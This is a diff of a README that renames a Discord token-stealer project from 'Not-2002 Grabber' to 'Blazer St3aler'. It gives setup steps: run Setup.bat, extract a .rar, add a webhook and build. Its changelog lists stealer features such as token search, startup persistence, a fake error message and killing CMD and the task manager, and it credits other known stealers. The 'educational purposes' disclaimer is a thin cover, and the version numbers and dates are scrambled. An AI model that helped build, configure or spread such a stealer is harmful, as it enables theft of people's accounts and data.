@@ -1,17 +1,17 @@
 
 <h1 align="center">
- Not-2002 Grabber 🔰
+ Blazer St3aler 🔰
 </h1>
 
 <h2 align="center">
-  Not-2002 Grabber was made with
+  Blazer St3aler was made with
 
 Love ❌ code ✅
 
 </h2>
 
 **NOTE:** \
-- Not-2002 was made for educational purposes, there for all consequences caused by your actions are **your** responsibility and accountability.
+- Blazer St3aler was made for educational purposes, there for all consequences caused by your actions are **your** responsibility and accountability.
 - You got an error? you've find a bug?? join the discord or create an issue!
 
 ---
@@ -25,10 +25,10 @@ Love ❌ code ✅
 - [💼・Term](#Term)
 
 
-## <a id="setup"></a> 📁 〢 Setting up Not-2002
+## <a id="setup"></a> 📁 〢 Setting up Blazer St3aler
 
 1. Install [Python](https://www.python.org/downloads/)
-2. Click on Not-2002 [Not-2002.exe]
+2. Click on [Setup.bat] And then open the Blazer St3aler file and Extract [Blazer St3aler.rar]
 3. Complete the configuration
 4. Add your Webhook
 5. Build
@@ -81,12 +81,12 @@ Love ❌ code ✅
 ## <a id="changelog"></a>💭 〢 ChangeLog
 
 ```diff
-v1.9 ⋮ 2022-26-10
+v2.3.0
 - bug fix to search token
 - error message fixed
 - build with pyinstaller fixed
 
-v2.0 : 2022-30-10
+v2.2.3 : 2022-30-10
 - enoent zipfile bug fixed
 + Place .exe in startup
 + Add Fake Error
@@ -107,7 +107,7 @@ v2.2: 2022-31-10
 + CMD and gestionnary killer
 
 
-v2.3: 2022-14-11
+v2.1.2: 2022-14-11
 + Detect New Discord Active Developer Badge
 ```
 
@@ -120,7 +120,7 @@ v2.3: 2022-14-11
 - Hazard Grabber
 - PirateStealer
 - Wasp-stealer
-- Builder by Luna token grabber 
+- 1336-Stealer
 
 
 ### <a id="Term"></a>💼 〢 Term of usage
